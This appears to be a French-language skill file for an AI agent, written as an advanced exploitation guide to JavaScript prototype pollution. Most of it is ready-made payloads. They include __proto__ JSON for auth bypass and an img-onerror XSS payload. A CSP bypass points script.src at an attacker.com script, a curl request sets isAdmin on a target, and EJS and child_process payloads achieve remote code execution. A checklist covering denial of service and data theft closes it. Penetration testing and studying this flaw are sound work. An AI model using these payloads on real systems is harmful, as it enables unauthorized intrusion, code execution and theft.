---
name: prototype-pollution
description: Guide complet d'exploitation de Prototype Pollution — client-side, server-side, Node.js, outils, détection et payloads avancés
---

# Prototype Pollution — Guide d'Exploitation Avancé

## Références principales
- **HackTricks** : https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/
- **PortSwigger** : https://portswigger.net/web-security/prototype-pollution
- **Snyk Research** : https://snyk.io/blog/prototype-pollution/

---

## 1. Concepts fondamentaux

En JavaScript, chaque objet hérite de `Object.prototype`. Modifier ce prototype ajoute une propriété à **tous** les objets de l'application.

```javascript
// Pollution de base
{}.__proto__.isAdmin = true;
// ou
Object.prototype.polluted = "yes";

// Maintenant TOUS les objets ont cette propriété
let obj = {};
console.log(obj.polluted); // "yes"
```

### Vecteurs courants
- `__proto__`
- `constructor.prototype`
- `Object.prototype`
- Via `Object.assign()` / `$.extend()` / `lodash.merge()`

---

## 2. Client-Side Prototype Pollution

### 2.1 Détection

```javascript
// Dans la console du navigateur
Object.prototype.polluted = "yes";
let test = {};
console.log(test.polluted); // "yes" → déjà pollué

// Détection de bibliothèques vulnérables
// jQuery $.extend, lodash merge, angular merge, etc.
```

### 2.2 Scripts DOM

```html
<!-- scripts sensibles qui lisent des propriétés du DOM -->
<script>
  var config = {
    url: "/api/data",
    template: "default"
  };
  // Si config.url est lu depuis un attribut DOM
  // Pollution → contrôle de url
</script>
```

### 2.3 Exploitation via merge

```javascript
// Bibliothèque vulnérable : jQuery $.extend
$.extend(true, {}, JSON.parse(input));  // input = {"__proto__": {"polluted": "yes"}}

// lodash.merge
_.merge({}, JSON.parse(input)); // input = {"__proto__": {"x": 1}}

// AngularJS merge
angular.merge({}, JSON.parse(input));
```

### 2.4 XSS via Prototype Pollution

```javascript
// Pollution du prototype avec un payload
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}

// Si une bibliothèque copie innerHTML dans un élément
// → XSS immédiat
```

### 2.5 Bypass de CSP

```javascript
// Pollution de script.src
{"__proto__": {"src": "https://attacker.com/evil.js"}}
```

---

## 3. Server-Side Prototype Pollution (Node.js)

### 3.1 Détection

```http
POST /api/update HTTP/1.1
Content-Type: application/json

{"__proto__": {"polluted": "yes"}}
```

```bash
# Vérifier si la pollution fonctionne
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'
```

### 3.2 RCE via Prototype Pollution

```javascript
// Cas : child_process.spawn dans un module
// Pollution de shell, env, etc.

// Exemple : pollution de spawnSync
Object.prototype.shell = true;
// Tous les appels à spawn/exec utilisent le shell → injection de commande si argument contrôlé

// Pollution de env
Object.prototype.env = {
  "EVIL_PATH": "/tmp/attacker"
};
```

### 3.3 RCE via Template Injection

```javascript
// Pollution de "opts" dans les moteurs de template
{"__proto__": {
  "cache": false,
  "compileDebug": true,
  "self": true,
  "debug": true,
  "localsName": "eval('require(\"child_process\").execSync(\"id\")')"
}}

// EJS version < 3.1.7
{"__proto__": {
  "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"
}}
```

### 3.4 Auth Bypass

```javascript
// Si l'app vérifie : if (user.isAdmin)
{"__proto__": {"isAdmin": true}}

// Ou pour les sessions
{"__proto__": {"permissions": ["admin"]}}
```

---

## 4. Payloads par bibliothèque

### Lodash

```javascript
// lodash.merge (versions < 4.17.11)
_.merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
// CVE-2018-3721, CVE-2019-10744
```

### jQuery

```javascript
// $.extend (versions < 3.4.0)
$.extend(true, {}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
// CVE-2019-11358
```

### Express

```javascript
// body-parser
app.use(express.json()); // par défaut, pas de protection
// Si body-parser < 1.19.0 → vulnérable
```

### EJS

```javascript
// EJS prototype pollution RCE (CVE-2022-29078)
{"__proto__": {
  "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"
}}
```

---

## 5. Outils

```bash
# PP Detector — Chrome extension
# https://github.com/msrkp/pp-detector

# Node.js scanner
npm audit  # Vérifier les dépendances vulnérables
npx snyk test

# Manual testing
# Chrome DevTools → console → Object.prototype
```

### Script de détection automatique

```javascript
// Injecter dans la page
let test = {};
let payload = JSON.parse('{"__proto__": {"testPP": true}}');
for (let key in payload) {
  test[key] = payload[key]; // merge
}
console.log(test.testPP); // true → vulnérable
```

---

## 6. Checklist

```
DÉTECTION
☐ Tester __proto__ dans les paramètres JSON
☐ Tester constructor.prototype
☐ Tester dans les paramètres URL / query string
☐ Tester dans les cookies
☐ Tester dans les headers personnalisés
☐ Vérifier jQuery, lodash, Angular, Express versions

CLIENT-SIDE
☐ Vérifier les bibliothèques JS vulnérables
☐ Tester XSS via innerHTML pollution
☐ Tester bypass CSP via script.src
☐ Tester DOM clobbering combiné
☐ Tester les scripts qui lisent les attributs DOM

SERVER-SIDE (Node.js)
☐ Tester auth bypass (isAdmin, role, permissions)
☐ Tester EJS template injection RCE
☐ Tester child_process shell injection
☐ Tester pollution de env
☐ Tester pollution de "type" (express, body-parser)
☐ Tester pollution de "cache", "debug" options

EXPLOITATION
☐ XSS via innerHTML
☐ RCE via EJS template
☐ Auth bypass
☐ Déni de service (boucle infinie, crash)
☐ Vol de données (pollution de config.apiUrl)
```